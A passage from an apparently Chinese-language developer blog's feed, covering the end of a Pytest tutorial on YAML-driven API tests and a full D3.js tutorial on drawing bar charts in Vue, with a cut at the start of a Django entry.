function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>yaml_file<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>yaml_file <span class="token operator">=</span> yaml_file    <span class="token comment" spellcheck="true">#读取yaml文件</span>    <span class="token keyword">def</span> <span class="token function">read_yaml</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span>self<span class="token punctuation">.</span>yaml_file<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            value <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">,</span>Loader<span class="token operator">=</span>yaml<span class="token punctuation">.</span>FullLoader<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#对yaml进行反序列化，就是把</span>            <span class="token keyword">return</span> value</code></pre><p><strong>test_api.yaml，设置测试用例规则</strong></p><pre class=" language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true">#用例1</span><span class="token punctuation">-</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> 测试test  <span class="token comment" spellcheck="true">#设置http请求</span>  <span class="token key atrule">request</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span>//127.0.0.1<span class="token punctuation">:</span>8000/test    <span class="token key atrule">method</span><span class="token punctuation">:</span> get    <span class="token key atrule">headers</span><span class="token punctuation">:</span>      <span class="token key atrule">Content-Type</span><span class="token punctuation">:</span> application/json  <span class="token comment" spellcheck="true">#断言 可分为业务断言与状态断言</span>  <span class="token key atrule">validate</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token key atrule">eq</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token key atrule">ret</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#用例2 不用重构代码，直接对yaml文件进行操作即可进行操作</span></code></pre><p><strong>test_api.py，对测试返回的结果进行处理</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pytest<span class="token keyword">import</span> requests<span class="token keyword">from</span> testcase<span class="token punctuation">.</span>yaml_util <span class="token keyword">import</span> YamlUtil<span class="token keyword">class</span> <span class="token class-name">TestApi</span><span class="token punctuation">:</span>    @pytest<span class="token punctuation">.</span>mark<span class="token punctuation">.</span>parametrize<span class="token punctuation">(</span><span class="token string">'args'</span><span class="token punctuation">,</span>YamlUtil<span class="token punctuation">(</span><span class="token string">'./testcase/test_api.yaml'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read_yaml<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#如果使用主函数模式运行测试用例，yaml文件路径必须是相对main函数所在文件的相对路径</span>    <span class="token keyword">def</span> <span class="token function">test_login</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#参数名</span>        <span class="token comment" spellcheck="true">#args为yaml文件内容的字典格式,如下图</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span>          url <span class="token operator">=</span> args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#响应消息体</span></code></pre><p><img src="https://img.imgdb.cn/item/60739e6b8322e6675c7647f4.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Pytest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D3-1</title>
      <link href="/2021/04/02/d3-1/"/>
      <url>/2021/04/02/d3-1/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>D3(Data Driven Documents)，数据驱动文档。</p><h3 id="在Vue中使用"><a href="#在Vue中使用" class="headerlink" title="在Vue中使用"></a>在Vue中使用</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><pre><code>npm install d3 --save</code></pre><h4 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h4><p>在组件中引用</p><pre><code>import * as d3 from &#39;d3&#39;</code></pre><h2 id="使用D3操作SVG"><a href="#使用D3操作SVG" class="headerlink" title="使用D3操作SVG"></a>使用D3操作SVG</h2><h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>SVG(Scalable Vector Graphics)，可缩放矢量图形，使用XML格式定义图像。即两点之间的连线是直线的话，不论怎样放大直线，两点之间的连线永远是直线，即放大不会失真，具有画图细腻性的特点。</p><h4 id="在html中使用svg"><a href="#在html中使用svg" class="headerlink" title="在html中使用svg"></a>在html中使用svg</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span></code></pre><h4 id="SVG常见属性"><a href="#SVG常见属性" class="headerlink" title="SVG常见属性"></a>SVG常见属性</h4><ul><li><font color=orange>id,class</font>  特殊的属性，可以使用.attr设置</li><li><font color=orange>x , y , cx , cy </font> 屏幕坐标系，cx,cy表示圆心的坐标</li><li><font color=orange>fill , stroke</font></li><li><font color=orange>height , width, r</font> 圆的半径</li><li><font color=orange>transform -&gt; translate, rotate, scale</font> 平移/旋转/缩放</li></ul><blockquote><p>SVG属性非常多，且属性的取值范围和类型各不同，养成及时查阅的习惯非常重要</p></blockquote><h5 id="设置属性"><a href="#设置属性" class="headerlink" title="设置属性"></a>设置属性</h5><p>设置/获取元素属性</p><pre class=" language-js"><code class="language-js">element<span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'attr_name'</span><span class="token punctuation">,</span><span class="token string">'attr_value'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//设置属性</span><span class="token keyword">var</span> value <span class="token operator">=</span> element<span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'attr_name'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//获取属性</span></code></pre><h3 id="使用D3添加或删除SVG元素"><a href="#使用D3添加或删除SVG元素" class="headerlink" title="使用D3添加或删除SVG元素"></a>使用D3添加或删除SVG元素</h3><h4 id="链式添加"><a href="#链式添加" class="headerlink" title="链式添加"></a>链式添加</h4><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> myRect <span class="token operator">=</span> d3<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token string">'#mainsvg'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'g'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span><span class="token string">'maingroup'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'height'</span><span class="token punctuation">,</span><span class="token string">'100px'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//设置id后继续设置高度</span></code></pre><h3 id="屏幕空间坐标系"><a href="#屏幕空间坐标系" class="headerlink" title="屏幕空间坐标系"></a>屏幕空间坐标系</h3><p>屏幕空间的坐标系与常见的坐标系不用，屏幕坐标系具有以下特点(图二)：</p><ul><li>左上方为远点</li><li>X、Y分别为水平向右、垂直向下</li></ul><p><img src="https://img.imgdb.cn/item/6066bebd8322e6675cc0c4ed.png" alt=""></p><h3 id="比例尺"><a href="#比例尺" class="headerlink" title="比例尺"></a>比例尺</h3><ul><li>比例尺用于把实际的数据空间映射到屏幕空间(一个像素对应多少数据)</li><li>比例尺非常重要，会经常同时传给坐标轴与数据</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> mySale <span class="token operator">=</span> d3<span class="token punctuation">.</span><span class="token function">scaleLinear</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//定义比例尺，返回值本质上是函数</span><span class="token keyword">const</span> mySale <span class="token operator">=</span> d3<span class="token punctuation">.</span><span class="token function">scaleLinear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">domain</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1000</span>，<span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//配置比例尺,domain表示实际数据，range表示屏幕空间，上述语句表示将0-10的数据映射到屏幕-1000-1000的范围</span><span class="token function">mySale</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//结果为0，5为0-10的中点，输出为-1000-1000的中点</span></code></pre><h2 id="使用D3生成柱状图"><a href="#使用D3生成柱状图" class="headerlink" title="使用D3生成柱状图"></a>使用D3生成柱状图</h2><h3 id="定义Margin"><a href="#定义Margin" class="headerlink" title="定义Margin"></a>定义Margin</h3><p><img src="https://img.imgdb.cn/item/6066cbb98322e6675cd00560.png" alt=""></p><ul><li>SVG对于D3.js来说是一个画布</li><li>SVG范围外的任何内容属于画布之外，浏览器不予显示</li><li>D3只对上图Margin的区域进行操作，防止D3坐标轴画到屏幕外边</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> margin <span class="token operator">=</span> <span class="token punctuation">{</span>top<span class="token punctuation">:</span><span class="token number">60</span><span class="token punctuation">,</span>right<span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">,</span>bottom<span class="token punctuation">:</span><span class="token number">60</span><span class="token punctuation">,</span>left<span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义margin ,数据可自定义</span></code></pre><p>vue</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1400<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>800<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>svgs<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> d3 <span class="token keyword">from</span> <span class="token string">'d3'</span><span class="token keyword">export</span> <span class="token keyword">default</span><span class="token punctuation">{</span>    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span><span class="token punctuation">{</span>            dataList<span class="token punctuation">:</span><span class="token punctuation">[</span>                <span class="token punctuation">{</span>name<span class="token punctuation">:</span><span class="token string">'zby'</span><span class="token punctuation">,</span>value<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token punctuation">{</span>name<span class="token punctuation">:</span><span class="token string">'as'</span><span class="token punctuation">,</span>value<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token punctuation">{</span>name<span class="token punctuation">:</span><span class="token string">'asd'</span><span class="token punctuation">,</span>value<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token punctuation">{</span>name<span class="token punctuation">:</span><span class="token string">'gtr'</span><span class="token punctuation">,</span>value<span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token punctuation">{</span>name<span class="token punctuation">:</span><span class="token string">'fgb'</span><span class="token punctuation">,</span>value<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token punctuation">{</span>name<span class="token punctuation">:</span><span class="token string">'ehr'</span><span class="token punctuation">,</span>value<span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token punctuation">{</span>name<span class="token punctuation">:</span><span class="token string">'dsj'</span><span class="token punctuation">,</span>value<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">showSvg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    methods<span class="token punctuation">:</span><span class="token punctuation">{</span>        <span class="token function">showSvg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">const</span> svg <span class="token operator">=</span> d3<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token string">'#id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//使用id获取svg画布</span>            <span class="token keyword">const</span> width <span class="token operator">=</span> <span class="token operator">+</span>svg<span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'width'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//+将字符串转为数字</span>            <span class="token keyword">const</span> height <span class="token operator">=</span> <span class="token operator">+</span>svg<span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'height'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> margin <span class="token operator">=</span> <span class="token punctuation">{</span>top<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">,</span>right<span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">,</span>bottom<span class="token punctuation">:</span><span class="token number">60</span><span class="token punctuation">,</span>left<span class="token punctuation">:</span><span class="token number">150</span><span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> innerWidth <span class="token operator">=</span> width<span class="token operator">-</span>margin<span class="token punctuation">.</span>left<span class="token operator">-</span>margin<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">const</span> innerHeight <span class="token operator">=</span> height <span class="token operator">-</span> margin<span class="token punctuation">.</span>top <span class="token operator">-</span> margin<span class="token punctuation">.</span>bottom<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//定义比例尺</span>            <span class="token comment" spellcheck="true">//x轴比例尺</span>            <span class="token keyword">const</span> xScale <span class="token operator">=</span> d3<span class="token punctuation">.</span><span class="token function">scaleLinear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">//d3.max第一个参数指明操作对象，第二个参数值的意思是this.dataList['value']，然后取value最大值</span>            <span class="token punctuation">.</span><span class="token function">domain</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span>d3<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>dataList<span class="token punctuation">,</span> d<span class="token operator">=</span><span class="token operator">></span>d<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//取决于渲染的值，此处取决于dataList</span>            <span class="token punctuation">.</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span>innerWidth<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//y轴比例尺</span>            <span class="token keyword">const</span> yScale <span class="token operator">=</span> d3<span class="token punctuation">.</span><span class="token function">scaleBand</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">domain</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>dataList<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>d<span class="token operator">=</span><span class="token operator">></span>d<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//映射this.dataList['name']</span>            <span class="token punctuation">.</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span>innerHeight<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//在y轴的每个变量中间预留位置</span>            <span class="token comment" spellcheck="true">//定义中间位置</span>            <span class="token keyword">const</span> g <span class="token operator">=</span> svg<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'g'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span><span class="token string">'maingroup'</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'transform'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`translate(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>margin<span class="token punctuation">.</span>left<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">,</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>margin<span class="token punctuation">.</span>top<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">)`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将坐标轴移到margin左上角</span>            <span class="token comment" spellcheck="true">//生成坐标轴</span>            <span class="token comment" spellcheck="true">//定义y轴</span>            <span class="token keyword">const</span> yAxis <span class="token operator">=</span> d3<span class="token punctuation">.</span><span class="token function">axisLeft</span><span class="token punctuation">(</span>yScale<span class="token punctuation">)</span><span class="token punctuation">;</span>            g<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'g'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>yAxis<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//把坐标轴容器填满，.call才是真正把坐标轴渲染出来的方法</span>            <span class="token comment" spellcheck="true">//定义x轴</span>            <span class="token keyword">const</span> xAxis <span class="token operator">=</span> d3<span class="token punctuation">.</span><span class="token function">axisBottom</span><span class="token punctuation">(</span>xScale<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//            g.append('g').call(xAxis);//x轴在上方</span>            g<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'g'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>xAxis<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'transform'</span><span class="token punctuation">,</span><span class="token template-string"><span class="token string">`translate(0,</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>innerHeight<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">)`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将x轴平移到下方</span>            <span class="token comment" spellcheck="true">//画柱状图</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>dataList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>d<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>                g<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'rect'</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'width'</span><span class="token punctuation">,</span><span class="token function">xScale</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//以value的值渲染柱形图width</span>                <span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'height'</span><span class="token punctuation">,</span>yScale<span class="token punctuation">.</span><span class="token function">bandwidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//y轴默认宽度</span>                <span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'fill'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//柱形图颜色</span>                <span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">,</span><span class="token function">yScale</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//柱形在y轴的渲染位置</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre><h2 id="Data-Join"><a href="#Data-Join" class="headerlink" title="Data-Join"></a>Data-Join</h2><p><font color=orange>Data-Join </font> 本质上是将数据与图元进行绑定</p><ul><li>每个国家的人数绑定到矩形的长度</li><li>疫情感染的人数绑定到圆的半径</li></ul><blockquote><p>使用Data-Join可以省去大量根据数据设置图元属性的代码量，对于动态变化的数据提供统一的接口</p></blockquote><ul><li>以数据为中心的可视化操作（根据数据的每个属性自动调整绑定图元的属性）</li><li>不再需要手动添加、修改、删除图元（会根据Data-Join的绑定自动推断）</li><li>如果图元的数目不等于数据的条目（根据数据条目的数量选定相应数量的图元）</li></ul><h3 id="D3-js绑定数据的三个状态"><a href="#D3-js绑定数据的三个状态" class="headerlink" title="D3.js绑定数据的三个状态"></a>D3.js绑定数据的三个状态</h3><ul><li><font color=orange>Update</font> 图元与数据条目相同，上述均为单纯的update</li><li><font color=orange>Enter</font>  数据的条目多于图元甚至没有图元，常用于第一次绑定数据</li><li><font color=orange>Exit</font>  数据的条目少于图元甚至没有数据，常用于结束可视化</li></ul><h3 id="使用Enter实现柱状图"><a href="#使用Enter实现柱状图" class="headerlink" title="使用Enter实现柱状图"></a>使用Enter实现柱状图</h3><p>画柱状图部分的代码改为列下的代码</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//enter前的语句用于占位，enter后d3由enter进入update状态，当dataList不为空时将自动渲染，data用于绑定渲染的数据对象</span>g<span class="token punctuation">.</span><span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token string">'.dataRect'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>dataList<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">enter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'rect'</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'class'</span><span class="token punctuation">,</span><span class="token string">'dataRect'</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'width'</span><span class="token punctuation">,</span>d<span class="token operator">=</span><span class="token operator">></span><span class="token function">xScale</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'height'</span><span class="token punctuation">,</span>yScale<span class="token punctuation">.</span><span class="token function">bandwidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">,</span>d<span class="token operator">=</span><span class="token operator">></span><span class="token function">yScale</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'fill'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'opacity'</span><span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">)</span></code></pre><h2 id="CSV数据"><a href="#CSV数据" class="headerlink" title="CSV数据"></a>CSV数据</h2><p>常见的CSV文件数据格式为</p><ul><li>第一行是属性列表</li><li>后续每行对应一条数据</li><li>CSV本质上是纯文本，区别于EXCEL格式</li></ul><h3 id="D3读取CSV数据"><a href="#D3读取CSV数据" class="headerlink" title="D3读取CSV数据"></a>D3读取CSV数据</h3><pre class=" language-js"><code class="language-js">d3<span class="token punctuation">.</span><span class="token function">csv</span><span class="token punctuation">(</span><span class="token string">'path/to/data.csv'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>data <span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><ul><li><font color=orange>.csv函数</font>  的返回值是一个JS的Promise对象（Promise对象用于执行异步操作）</li><li><font color=orange>.then()</font>  的参数为一个函数 ，参数为.csv的返回值</li><li><font color=orange>d3.csv()</font>  会正常向服务器请求数据，在请求并处理好之后，将结果扔给.then()中的回调函数。</li></ul><pre class=" language-js"><code class="language-js">d3<span class="token punctuation">.</span><span class="token function">csv</span><span class="token punctuation">(</span><span class="token string">'path/to/data.csv'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>data<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    data <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>d<span class="token operator">=</span><span class="token operator">></span>d<span class="token punctuation">[</span><span class="token string">'地区'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'总计'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//保留地区不是总计的数据</span>    data<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>d<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>        name <span class="token operator">=</span> d<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">//获取name属性</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h2 id="Path"><a href="#Path" class="headerlink" title="Path"></a>Path</h2><p>path 元素是SVG基本形状中最强大的一个。可以用path绘制基本图形，包括贝塞尔曲线、2次曲线等</p><ul><li>path元素的形状是通过属性d来定义的，属性d的值是一个“命令+参数”的序列</li></ul><h3 id="path属性"><a href="#path属性" class="headerlink" title="path属性"></a>path属性</h3><ul><li><p><font color=orange>d</font></p></li><li><p><font color=orange>fill</font>  填充颜色</p></li><li><p><font color=orange>stroke</font> 描边颜色</p></li><li><p><font color=orange>stroke-width</font>  描边宽度</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 项目开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> D3.js </tag>
            
            <tag> Vue </tag>
            
            <tag> CSV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django开发</title>
      <link href="/2021/03/03/django1/"/>
      <url>/2021/03/03/django1/</url>
      
